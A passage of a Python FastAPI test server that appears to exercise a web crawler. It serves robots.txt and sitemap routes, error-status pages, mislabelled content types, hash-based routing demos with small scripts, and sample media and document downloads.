    return Response(content=content, status_code=503, media_type="application/xml")


@app.get("/weather/vancouver-daily-report", response_class=HTMLResponse)
async def weather_vancouver_daily_report():
    return html_page(
        "Vancouver daily weather report",
        vancouver_daily_weather_body(),
        script=vancouver_daily_weather_script(),
    )


@app.get("/weather/vancouver-daily-report/data.json")
async def weather_vancouver_daily_report_data(city: str = DEFAULT_WEATHER_CITY):
    return JSONResponse(weather_payload(city))


@app.get("/localhost-link", response_class=HTMLResponse)
async def localhost_link(request: Request):
    port = request.url.port
    localhost_base = f"http://localhost:{port}" if port else "http://localhost"
    loopback_base = f"http://127.0.0.1:{port}" if port else "http://127.0.0.1"
    body = f"""
    <p>This page exposes absolute localhost and loopback links for crawler URL normalization tests.</p>
    <ul>
      <li><a href="{localhost_base}/about">Localhost About link</a></li>
      <li><a href="{loopback_base}/about">127.0.0.1 About link</a></li>
      <li><a href="{localhost_base}/query-page?from=localhost-link">Localhost query link</a></li>
    </ul>
    """
    return html_page("Localhost Links", body)


@app.get("/wrong-content-type-html-as-text")
async def wrong_content_type_html_as_text():
    content = """<!doctype html>
<html>
  <head><title>HTML Served As Text</title></head>
  <body>
    <main>
      <p>This is valid HTML, but the HTTP Content-Type is text/plain.</p>
      <a href="/about?from=html-as-text">HTML-as-text child link</a>
    </main>
  </body>
</html>"""
    return Response(content=content, media_type="text/plain")


@app.get("/wrong-content-type-json-as-html")
async def wrong_content_type_json_as_html():
    content = json.dumps(
        {
            "title": "Noodle payload",
            "description": "This body is JSON-shaped, but the HTTP Content-Type is text/html.",
            "url": "/about?from=json-as-html",
        },
        sort_keys=True,
    )
    return Response(content=content, media_type="text/html")


@app.get("/legacy.php", response_class=HTMLResponse)
async def legacy_php():
    body = """
    <p>Legacy PHP-style path serving a normal HTML noodle page.</p>
    <a href="/query-page?from=legacy-php">Legacy PHP child link</a>
    """
    return html_page("Legacy PHP Page", body)


@app.get("/robots.txt")
async def robots_txt(request: Request):
    base = str(request.base_url).rstrip("/")
    content = f"""User-agent: *
Disallow: /robots-blocked
Disallow: /sitemap-invalid-404
Sitemap: {base}/sitemap.xml
"""
    return PlainTextResponse(content)


@app.get("/robots-blocked", response_class=HTMLResponse)
async def robots_blocked():
    body = """
    <p>This valid noodle page is disallowed by robots.txt.</p>
    <a href="/about?from=robots-blocked">Robots blocked child link</a>
    """
    return html_page("Robots Blocked Page", body)


SITEMAP_XMLNS = "http://www.sitemaps.org/schemas/sitemap/0.9"
STRUCTURED_CONTENT_GROUPS = ["table", "list", "markdown", "article"]
STRUCTURED_CONTENT_OVERVIEW_PATHS = [
    "/structured-content",
    "/structured-content/table",
    "/structured-content/list",
    "/structured-content/markdown",
    "/structured-content/article",
]
EXTRA_SITEMAP_SECTION_PATHS = {
    "discovery-policy": ["/sitemap-invalid-404", "/robots-blocked"],
}


def sitemap_response(content: str) -> Response:
    return Response(content=content, media_type="application/xml")


def absolute_sitemap_url(base: str, path: str) -> str:
    if path.startswith(("http://", "https://")):
        return path
    return f"{base}{path}"


def unique_sitemap_paths(paths: list[str]) -> list[str]:
    seen: set[str] = set()
    unique_paths: list[str] = []
    for path in paths:
        if path in seen:
            continue
        seen.add(path)
        unique_paths.append(path)
    return unique_paths


def sitemap_index_paths() -> list[str]:
    section_paths = [f"/sitemaps/{section['id']}.xml" for section in SECTION_METADATA]
    structured_paths = [f"/sitemaps/structured-content/{group}.xml" for group in STRUCTURED_CONTENT_GROUPS]
    return [*section_paths, *structured_paths]


def sitemap_changefreq_by_path() -> dict[str, str]:
    return {
        entry["path"]: entry["sitemap_changefreq"]
        for entry in PAGE_MANIFEST
        if entry.get("sitemap_changefreq")
    }


def render_sitemap_index(base: str, paths: list[str]) -> str:
    entries = "".join(
        f"  <sitemap><loc>{escape(absolute_sitemap_url(base, path))}</loc></sitemap>\n"
        for path in paths
    )
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<sitemapindex xmlns="{SITEMAP_XMLNS}">
{entries}</sitemapindex>
"""


def render_sitemap_urlset(base: str, paths: list[str]) -> str:
    changefreq_by_path = sitemap_changefreq_by_path()
    entries = []
    for path in unique_sitemap_paths(paths):
        changefreq = changefreq_by_path.get(path)
        loc = escape(absolute_sitemap_url(base, path))
        if changefreq:
            entries.append(f"  <url><loc>{loc}</loc><changefreq>{escape(changefreq)}</changefreq></url>\n")
        else:
            entries.append(f"  <url><loc>{loc}</loc></url>\n")
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="{SITEMAP_XMLNS}">
{"".join(entries)}</urlset>
"""


def section_sitemap_paths(section_id: str) -> list[str] | None:
    valid_section_ids = {section["id"] for section in SECTION_METADATA}
    if section_id not in valid_section_ids:
        return None
    if section_id == "structured-content":
        return STRUCTURED_CONTENT_OVERVIEW_PATHS

    paths = [entry["path"] for entry in PAGE_MANIFEST if entry.get("section_id") == section_id]
    paths.extend(EXTRA_SITEMAP_SECTION_PATHS.get(section_id, []))
    return paths


def structured_group_sitemap_paths(group: str) -> list[str] | None:
    if group not in STRUCTURED_CONTENT_GROUPS:
        return None
    return [
        entry["path"]
        for entry in PAGE_MANIFEST
        if entry.get("section_id") == "structured-content" and entry.get("structured_group") == group
    ]


@app.get("/sitemap.xml")
async def sitemap_xml(request: Request):
    base = str(request.base_url).rstrip("/")
    return sitemap_response(render_sitemap_index(base, sitemap_index_paths()))


@app.get("/sitemaps/{section_id}.xml")
async def section_sitemap_xml(section_id: str, request: Request):
    paths = section_sitemap_paths(section_id)
    if paths is None:
        return PlainTextResponse("Unknown sitemap section", status_code=404)
    base = str(request.base_url).rstrip("/")
    return sitemap_response(render_sitemap_urlset(base, paths))


@app.get("/sitemaps/structured-content/{group}.xml")
async def structured_content_group_sitemap_xml(group: str, request: Request):
    paths = structured_group_sitemap_paths(group)
    if paths is None:
        return PlainTextResponse("Unknown structured content sitemap", status_code=404)
    base = str(request.base_url).rstrip("/")
    return sitemap_response(render_sitemap_urlset(base, paths))


@app.get("/sitemap-invalid-404")
async def sitemap_invalid_404():
    return PlainTextResponse("Invalid sitemap target", status_code=404)


@app.get("/status/403")
async def status_403():
    return PlainTextResponse("Forbidden test page", status_code=403)


@app.get("/status/404")
async def status_404():
    return PlainTextResponse("Missing test page", status_code=404)


@app.get("/status/429")
async def status_429():
    return PlainTextResponse("Rate limited test page", status_code=429, headers={"Retry-After": "1"})


@app.get("/status/500")
async def status_500():
    return PlainTextResponse("Server error test page", status_code=500)


@app.get("/status/504")
async def status_504():
    return PlainTextResponse("Gateway timeout test page", status_code=504, headers={"Retry-After": "3"})


@app.get("/status/504-html-external-link")
async def status_504_html_external_link():
    body = """
    <h1>504 Gateway Timeout</h1>
    <p>The upstream server did not respond in time. This error page is intentionally
       served as <code>text/html</code> with a non-empty body so that crawler behaviour
       on HTML-bodied error responses can be exercised.</p>
    <p>For more information, follow this
       <a href="/error-link-to-nowhere">helpful reference link</a>.</p>
    <p>You can also <a href="/about">return to the About page</a> while the upstream recovers.</p>
    """
    return HTMLResponse(
        content=html_document("Gateway Timeout (HTML body with link to nowhere)", body),
        status_code=504,
        headers={"Retry-After": "3"},
    )


@app.get("/error-link-to-nowhere", response_class=HTMLResponse)
async def error_link_to_nowhere():
    body = """
    <h1>Error link that leads to nowhere</h1>
    <p>You followed a link from an error page. It led here. There is nothing useful on this page.</p>
    <p>This page exists so the crawler can confirm that links embedded inside HTML-bodied error
       responses are (or are not) followed, and to give those followed links a deterministic landing
       target.</p>
    """
    return html_page("Error link that leads to nowhere", body)


@app.get("/hash-anchors", response_class=HTMLResponse)
async def hash_anchors():
    body = """
    <p>This page uses traditional anchor-based hash navigation. All three sections are always
       present in the HTML — the hash only controls scroll position, not what is rendered.
       A crawler should treat <code>/hash-anchors</code>, <code>/hash-anchors#section-a</code>,
       and <code>/hash-anchors#section-b</code> as the same page.</p>
    <nav>
      <a href="#section-a">Section A</a>
      <a href="#section-b">Section B</a>
      <a href="#section-c">Section C</a>
    </nav>
    <section id="section-a">
      <h2>Section A</h2>
      <p>Content for section A. This is a traditional anchor link target — always rendered in the HTML.</p>
      <a href="#section-b">Jump to Section B</a>
    </section>
    <section id="section-b">
      <h2>Section B</h2>
      <p>Content for section B. The hash controls scroll position only, not what is rendered on the server.</p>
      <a href="#section-c">Jump to Section C</a>
    </section>
    <section id="section-c">
      <h2>Section C</h2>
      <p>Content for section C. All three sections exist in the DOM regardless of the current hash.</p>
      <a href="#section-a">Back to Section A</a>
    </section>
    """
    return html_page("Hash anchor sections", body)


@app.get("/hash-router", response_class=HTMLResponse)
async def hash_router():
    body = """
    <p>This page uses hash-based SPA routing. Only one section is visible at a time — JavaScript
       reads <code>window.location.hash</code> and renders matching content into the page.
       A crawler would need to follow each hash link and execute the JavaScript to see the content
       for <code>#overview</code>, <code>#specs</code>, and <code>#reviews</code>.</p>
    <nav>
      <a href="#overview">Overview</a>
      <a href="#specs">Specs</a>
      <a href="#reviews">Reviews</a>
    </nav>
    <div id="hash-content">
      <p><em>Loading route...</em></p>
    </div>
    """
    script = """
<script>
  const routes = {
    "overview": "<h2>Overview</h2><p>This is the overview section. It is only in the DOM when the hash is <code>#overview</code> or absent.</p><p><a href='/about'>About page</a></p>",
    "specs":    "<h2>Specs</h2><p>This is the specs section. A crawler that does not execute JavaScript will never see this content.</p>",
    "reviews":  "<h2>Reviews</h2><p>This is the reviews section. Each hash route is a separate content state on a single URL path.</p>",
  };

  function renderRoute() {
    const hash = window.location.hash.slice(1) || "overview";
    document.getElementById("hash-content").innerHTML =
      routes[hash] || "<p>Unknown route: <code>" + hash + "</code>.</p>";
  }

  window.addEventListener("hashchange", renderRoute);
  renderRoute();
</script>"""
    return html_page("Hash router (SPA-style)", body, script=script)


@app.get("/hash-path-router", response_class=HTMLResponse)
async def hash_path_router():
    body = """
    <p>This page uses hash-path routing — the URL hash contains a full routable path
       (e.g. <code>/hash-path-router#/products/detail</code>). This is the pattern used by
       Angular, Vue Router in hash mode, and React HashRouter. The server always returns the
       same HTML regardless of the hash; all routing is handled client-side by JavaScript
       reading <code>window.location.hash</code>.</p>
    <nav>
      <a href="#/">Home</a>
      <a href="#/about">About</a>
      <a href="#/products">Products</a>
      <a href="#/products/detail">Product detail</a>
    </nav>
    <div id="hash-path-content">
      <p><em>Loading...</em></p>
    </div>
    """
    script = """
<script>
  const routes = {
    "/":                "<h2>Home</h2><p>Hash-path router home. The full URL is <code>/hash-path-router#/</code>.</p>",
    "/about":           "<h2>About</h2><p>Hash-path router about page. Full URL: <code>/hash-path-router#/about</code>. This content only exists in the DOM after JavaScript runs.</p>",
    "/products":        "<h2>Products</h2><p>Hash-path router products list. Full URL: <code>/hash-path-router#/products</code>.</p><p><a href='#/products/detail'>View product detail</a></p>",
    "/products/detail": "<h2>Product detail</h2><p>Hash-path router nested route. Full URL: <code>/hash-path-router#/products/detail</code>. This is two levels deep inside the hash path.</p>",
  };

  function renderRoute() {
    const hashPath = window.location.hash.replace(/^#/, "") || "/";
    document.getElementById("hash-path-content").innerHTML =
      routes[hashPath] || "<p>Unknown hash route: <code>" + hashPath + "</code>.</p>";
  }

  window.addEventListener("hashchange", renderRoute);
  renderRoute();
</script>"""
    return html_page("Hash-path router (Angular / Vue hash mode style)", body, script=script)


@app.get("/hash-query-combo", response_class=HTMLResponse)
async def hash_query_combo(q: str = ""):
    query_display = escape(q) if q else "<em>No query entered.</em>"
    body = f"""
    <p>This page combines a query string with a hash fragment. The full URL looks like
       <code>/hash-query-combo?q=test#results</code>. The <code>?q=</code> parameter is
       processed server-side; the <code>#results</code> fragment scrolls the page to the
       results section. A crawler must parse <code>?</code> before <code>#</code> to correctly
       extract the query parameters — if it treats everything after <code>#</code> as the
       fragment, it will miss <code>?q=test</code>; if it treats <code>#results</code> as part
       of the query string, it will send a malformed request.</p>
    <form action="/hash-query-combo" method="get">
      <input name="q" value="{escape(q, quote=True)}" placeholder="Enter a search query" />
      <button type="submit">Search</button>
    </form>
    <section id="results">
      <h2>Results</h2>
      <p>Query: {query_display}</p>
    </section>
    """
    return html_page("Query string + hash fragment combo", body)


@app.get("/hashbang-router", response_class=HTMLResponse)
async def hashbang_router():
    body = """
    <p>This page uses the <code>#!</code> hashbang pattern. This was the mechanism Google
       recommended (2009–2015) for making AJAX-rendered content crawlable: when Googlebot
       encountered <code>#!/route</code> it would instead fetch
       <code>?_escaped_fragment_=/route</code> from the server. Some crawlers still recognise
       <code>#!</code> as a special signal; others treat it like any other hash fragment.</p>
    <nav>
      <a href="#!/home">Home</a>
      <a href="#!/about">About</a>
      <a href="#!/contact">Contact</a>
    </nav>
    <div id="hashbang-content">
      <p><em>Loading...</em></p>
    </div>
    """
    script = """
<script>
  const routes = {
    "home":    "<h2>Home</h2><p>Hashbang home route. Full URL: <code>/hashbang-router#!/home</code>. A crawler that rewrites <code>#!</code> to <code>?_escaped_fragment_=</code> would request <code>/hashbang-router?_escaped_fragment_=home</code> instead.</p>",
    "about":   "<h2>About</h2><p>Hashbang about route. Full URL: <code>/hashbang-router#!/about</code>. Content is only visible after JavaScript executes.</p>",
    "contact": "<h2>Contact</h2><p>Hashbang contact route. Full URL: <code>/hashbang-router#!/contact</code>.</p>",
  };

  function renderRoute() {
    const hash = window.location.hash;
    const route = hash.startsWith("#!") ? hash.slice(2) : "home";
    document.getElementById("hashbang-content").innerHTML =
      routes[route] || "<p>Unknown route: <code>" + route + "</code>.</p>";
  }

  window.addEventListener("hashchange", renderRoute);
  renderRoute();
</script>"""
    return html_page("Hashbang router (#! pattern)", body, script=script)


@app.get("/percent-encoded-hash", response_class=HTMLResponse)
async def percent_encoded_hash():
    body = """
    <p>This page demonstrates the difference between <code>#</code> (a fragment delimiter, never
       sent to the server) and <code>%23</code> (a percent-encoded literal hash character that
       <em>is</em> part of the path or query string sent to the server). They look similar in a
       URL but are entirely different things.</p>
    <ul>
      <li>
        <a href="#real-anchor">Fragment link: <code>#real-anchor</code></a> —
        browser scrolls to the section below; server only sees a request for
        <code>/percent-encoded-hash</code>.
      </li>
      <li>
        <a href="/percent-encoded-hash%23real-anchor">Encoded-hash link: <code>/percent-encoded-hash%23real-anchor</code></a> —
        server receives a request for the path <code>/percent-encoded-hash%23real-anchor</code>
        (a different URL entirely), which returns 404. A crawler that strips <code>%23</code>
        as if it were a fragment delimiter would incorrectly record a 200 instead.
      </li>
      <li>
        <a href="/query-page?ref=%23section">Query param with <code>%23</code>: <code>/query-page?ref=%23section</code></a> —
        the <code>%23</code> decodes to a literal <code>#</code> in the query value, not a fragment.
        The server receives <code>ref=#section</code> as a query parameter.
      </li>
    </ul>
    <section id="real-anchor">
      <h2>Real anchor section</h2>
      <p>Reachable via the fragment <code>#real-anchor</code>. Always present in the HTML —
         the hash only scrolls here and is never sent to the server.</p>
    </section>
    """
    return html_page("Percent-encoded hash (%23) vs fragment (#)", body)


@app.get("/files/sample.pdf")
async def sample_pdf():
    return Response(content=MINIMAL_PDF, media_type="application/pdf")


@app.get("/files/sample.docx")
async def sample_docx():
    return Response(
        content=MINIMAL_DOCX,
        media_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    )


@app.get("/media/pixel.jpg")
async def sample_jpg():
    return Response(content=MINIMAL_JPG, media_type="image/jpeg")


@app.get("/media/png-example.png")
async def png_example():
    return FileResponse(APP_DIR / "images" / "png example.png", media_type="image/png")


@app.get("/media/gif-example.gif")
async def gif_example():
    return FileResponse(APP_DIR / "images" / "gif example.gif", media_type="image/gif")


@app.get("/media/webpfile.webp")
async def webp_example():
    return FileResponse(APP_DIR / "images" / "webpfile.webp", media_type="image/webp")


@app.get("/media/bank-card-svgrepo-com.svg")
async def svg_example():
    return FileResponse(APP_DIR / "images" / "bank-card-svgrepo-com.svg", media_type="image/svg+xml")


@app.get("/media/shrek-rizz-face.jpg")
async def shrek_rizz_face_jpg():
    return FileResponse(APP_DIR / "images" / "shrek rizz face.jpg", media_type="image/jpeg")


@app.get("/download/sample.zip")
async def sample_zip():
    return Response(content=MINIMAL_ZIP, media_type="application/zip")
